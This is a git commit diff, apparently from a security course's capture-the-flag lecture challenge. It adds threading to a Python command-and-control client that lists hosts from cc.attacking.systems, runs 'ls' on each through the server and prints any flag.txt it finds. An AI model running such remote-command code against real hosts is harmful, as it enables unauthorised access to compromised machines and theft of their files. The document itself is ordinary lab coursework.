68bf7cf8d2fd959431d26f668ae86130776c2bfd
TrickShotMLG02 <tim.schlachter@shinternet.ch>
2023-04-13 17:24:19 +0200

    Finished LectureChallenge

--- CommandControlServer.py
+++ CommandControlServer.py
@@ -1,4 +1,5 @@
 import requests
+import threading
 
 clientListingURL = "https://cc.attacking.systems/?command=list"
 
@@ -10,15 +11,22 @@ def sendCommand(command):
     r = requests.get("https://cc.attacking.systems/?command="+command)
     return r.text
 
+def sendCommandThread(clientIP):
+    res = sendCommand("run " + clientIP + " ls")
+    if res.__contains__("flag"):
+        print("Found CYSEC flag file on host " + clientIP)
+        res = sendCommand("run " + clientIP + " cat flag.txt")
+        print("flag: " + res)
+
 def main():
     clientIPs = getClientIPs()
-    #print("Client IPs: " + str(clientIPs))
+    threads = []
     for clientIP in clientIPs:
-        res = sendCommand("run " + clientIP + " ls")
-        if res.__contains__("CYSEC"):
-            print("Found CYSEC flag on " + clientIP)
-            print(res)
-
+        thread = threading.Thread(target=sendCommandThread, args=(clientIP,))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
     main()
